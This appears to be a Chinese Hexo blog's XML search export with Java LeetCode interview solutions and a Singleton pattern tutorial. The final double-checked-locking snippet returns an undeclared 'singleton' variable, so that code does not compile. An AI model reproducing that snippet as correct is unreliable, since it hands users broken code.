<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countNegatives</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> m = grid[<span class="number">0</span>].length;</span><br><span class="line">		<span class="keyword">int</span> pos = grid[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span>[] x : grid) &#123;</span><br><span class="line">			<span class="keyword">int</span> i;</span><br><span class="line">			<span class="keyword">for</span> (i = pos; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">				<span class="keyword">if</span> (x[i] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (i + <span class="number">1</span> &lt; m) &#123;</span><br><span class="line">						pos = i + <span class="number">1</span>;</span><br><span class="line">						num += m - pos;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (i == -<span class="number">1</span>) &#123;</span><br><span class="line">				num += m;</span><br><span class="line">				pos = -<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> num;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题05. 替换空格</title>
    <url>/2020/04/09/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-05-%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请实现一个函数，把字符串 <code>s</code> 中的每个空格替换成”%20”。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;We are happy.&quot;</span><br><span class="line">输出：&quot;We%20are%20happy.&quot;</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用库函数</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replaceSpace</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s.replaceAll(<span class="string">" "</span>, <span class="string">"%20"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用StringBuilder</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public String replaceSpace(String s) &#123;</span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line">        for (char c : s.toCharArray()) &#123;</span><br><span class="line">            if (&#39; &#39; &#x3D;&#x3D; c) &#123;</span><br><span class="line">                sb.append(&quot;%20&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 02.02. 返回倒数第 k 个节点</title>
    <url>/2020/04/09/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-02.02-%E8%BF%94%E5%9B%9E%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现一种算法，找出单向链表中倒数第 k 个节点。返回该节点的值。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 1-&gt;2-&gt;3-&gt;4-&gt;5 和 k &#x3D; 2</span><br><span class="line">输出： 4</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>给定的 <em>k</em> 保证是有效的。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>双指针，p1，p2同时指向head。p2先向前移动k步，然后p1，p2一起向前移动，直到p2到达链表末尾，返回p1的值即可</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthToLast</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        ListNode p1 = head;</span><br><span class="line">        ListNode p2 = head;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != p2) &#123;</span><br><span class="line">            p1 = p1.next;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p1.val;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 17 打印从1到最大的n位数</title>
    <url>/2020/04/09/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-17-%E6%89%93%E5%8D%B0%E4%BB%8E1%E5%88%B0%E6%9C%80%E5%A4%A7%E7%9A%84n%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入数字 <code>n</code>，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数 999。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: n &#x3D; 1</span><br><span class="line">输出: [1,2,3,4,5,6,7,8,9]</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>用返回一个整数列表来代替打印</li>
<li>n 为正整数</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>求出位数的上届，按顺序生成数组即可</p>
<p>上届就是1 * 10^n - 1</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] printNumbers(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span> upBound = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            upBound *= <span class="number">10</span>;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[upBound - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; result.length;i++) &#123;</span><br><span class="line">            result[i] = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题. II. 左旋转字符串</title>
    <url>/2020/04/09/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-58-II.%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab”。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abcdefg&quot;, k &#x3D; 2</span><br><span class="line">输出: &quot;cdefgab&quot;</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abcdefg&quot;, k &#x3D; 2</span><br><span class="line">输出: &quot;cdefgab&quot;</span><br></pre></td></tr></table></figure>

<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;&#x3D; k &lt; s.length &lt;&#x3D; 10000</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>先对n用字符串的长度取余，然后截取前后半段，交换位置拼接</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseLeftWords</span><span class="params">(String s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		n = n % s.length();</span><br><span class="line">		<span class="keyword">return</span> s.substring(n, s.length()) + s.substring(<span class="number">0</span>, n);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>利用旋转后的字符串一定在s+s中的原理</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">reverseLeftWords</span><span class="params">(String s, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (s + s).substring(n, n + s.length());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题22. 链表中倒数第k个节点</title>
    <url>/2020/04/09/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-22-%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACK%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k &#x3D; 2.</span><br><span class="line"></span><br><span class="line">返回链表 4-&gt;5.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>双指针</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">getKthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        ListNode p1 = head;</span><br><span class="line">        ListNode p2 = head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != p2) &#123;</span><br><span class="line">            p1 = p1.next;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
        <tag>双指针</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 04.02. 最小高度树</title>
    <url>/2020/04/09/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-04.02-%E6%9C%80%E5%B0%8F%E9%AB%98%E5%BA%A6%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个有序整数数组，元素各不相同且按升序排列，编写一个算法，创建一棵高度最小的二叉搜索树。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定有序数组: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</span><br><span class="line"></span><br><span class="line">          0 </span><br><span class="line">         &#x2F; \ </span><br><span class="line">       -3   9 </span><br><span class="line">       &#x2F;   &#x2F; </span><br><span class="line">     -10  5</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归建树</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> buildTree(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (begin &gt; end) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (begin == end) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> TreeNode(nums[begin]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> mid = (begin + end) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        TreeNode node = <span class="keyword">new</span> TreeNode(nums[mid]);</span><br><span class="line">        node.left = buildTree(nums, begin, mid - <span class="number">1</span>);</span><br><span class="line">        node.right = buildTree(nums, mid + <span class="number">1</span>, end);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>递归</tag>
        <tag>二叉搜索树</tag>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 55. 二叉树的深度</title>
    <url>/2020/04/09/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-55-I%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，找出其最大深度。</p>
<p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>
<p>说明: 叶子节点是指没有子节点的节点。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p>给定二叉树 <code>[3,9,20,null,null,15,7]</code>，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>返回它的最大深度 3 。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归求解"><a href="#解法一：递归求解" class="headerlink" title="解法一：递归求解"></a>解法一：递归求解</h3><p>分别求出左右子树的最大深度，最后加一就行。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> dl = maxDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> dr = maxDepth(root.right) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> dl &gt; dr ? dl : dr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：借助栈"><a href="#解法二：借助栈" class="headerlink" title="解法二：借助栈"></a>解法二：借助栈</h3><p>我们还可以在栈的帮助下将上面的递归转换为迭代。</p>
<p>使用 DFS 策略访问每个结点，同时在每次访问时更新最大深度。</p>
<p>所以我们从包含根结点且相应深度为 1 的栈开始。然后我们继续迭代：将当前结点弹出栈并推入子结点。每一步都会更新深度.</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Queue&lt;Pair&lt;TreeNode, Integer&gt;&gt; stack = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">      stack.add(<span class="keyword">new</span> Pair(root, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">      Pair&lt;TreeNode, Integer&gt; current = stack.poll();</span><br><span class="line">      root = current.getKey();</span><br><span class="line">      <span class="keyword">int</span> current_depth = current.getValue();</span><br><span class="line">      <span class="keyword">if</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">        depth = Math.max(depth, current_depth);</span><br><span class="line">        stack.add(<span class="keyword">new</span> Pair(root.left, current_depth + <span class="number">1</span>));</span><br><span class="line">        stack.add(<span class="keyword">new</span> Pair(root.right, current_depth + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> depth;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-单例模式</title>
    <url>/2020/04/09/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p>
<p>这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。</p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>单例类只能有一个实例。</li>
<li>单例类必须自己创建自己的唯一实例。</li>
<li>单例类必须给所有其他对象提供这一实例</li>
</ul>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-singleton1.png" alt="单例模式类图"></p>
<h3 id="Singleton"><a href="#Singleton" class="headerlink" title="Singleton"></a>Singleton</h3><p>它包含一个返回唯一实例的static方法。该方法总是返回同一个实例。构造函数为私有的，不可调用</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-singleton1.png" alt="单例模式示例类图"></p>
<h3 id="Singleton-1"><a href="#Singleton-1" class="headerlink" title="Singleton"></a>Singleton</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"生成了一个实例"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> singleton;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Start"</span>);</span><br><span class="line">		Singleton s1 = Singleton.getInstance();</span><br><span class="line">		Singleton s2 = Singleton.getInstance();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (s1 == s2) &#123;</span><br><span class="line">			System.out.println(<span class="string">"true"</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"false"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"End."</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单例模式的7种写法"><a href="#单例模式的7种写法" class="headerlink" title="单例模式的7种写法"></a>单例模式的7种写法</h2><h3 id="饿汉模式"><a href="#饿汉模式" class="headerlink" title="饿汉模式"></a>饿汉模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;  </span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();  </span><br><span class="line">     <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span> <span class="params">()</span></span>&#123;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">     <span class="keyword">return</span> instance;  </span><br><span class="line">     &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这种方式在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快。 这种方式基于类加载机制避免了多线程的同步问题，但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化instance显然没有达到懒加载的效果。</p>
<h3 id="懒汉模式（线程不安全）"><a href="#懒汉模式（线程不安全）" class="headerlink" title="懒汉模式（线程不安全）"></a>懒汉模式（线程不安全）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;  </span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;  </span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span> <span class="params">()</span></span>&#123;</span><br><span class="line">      &#125;   </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;  </span><br><span class="line">          instance = <span class="keyword">new</span> Singleton();  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="keyword">return</span> instance;  </span><br><span class="line">      &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>懒汉模式申明了一个静态对象，在用户第一次调用时初始化，虽然节约了资源，但第一次加载时需要实例化，反映稍慢一些，而且在多线程不能正常工作。</p>
<h3 id="懒汉模式（线程安全）"><a href="#懒汉模式（线程安全）" class="headerlink" title="懒汉模式（线程安全）"></a>懒汉模式（线程安全）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;  </span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;  </span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span> <span class="params">()</span></span>&#123;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;  </span><br><span class="line">          instance = <span class="keyword">new</span> Singleton();  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="keyword">return</span> instance;  </span><br><span class="line">      &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这种写法能够在多线程中很好的工作，但是每次调用getInstance方法时都需要进行同步，造成不必要的同步开销，而且大部分时候我们是用不到同步的，所以不建议用这种模式。</p>
<h3 id="双重检查模式-DCL"><a href="#双重检查模式-DCL" class="headerlink" title="双重检查模式(DCL)"></a>双重检查模式(DCL)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;  </span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton instance;  </span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span> <span class="params">()</span></span>&#123;</span><br><span class="line">      &#125;   </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (instance== <span class="keyword">null</span>) &#123;  </span><br><span class="line">          <span class="keyword">synchronized</span> (Singleton<span class="class">.<span class="keyword">class</span>) </span>&#123;  </span><br><span class="line">          <span class="keyword">if</span> (instance== <span class="keyword">null</span>) &#123;  </span><br><span class="line">              instance= <span class="keyword">new</span> Singleton();  </span><br><span class="line">          &#125;  </span><br><span class="line">         &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">     <span class="keyword">return</span> singleton;  </span><br><span class="line">     &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

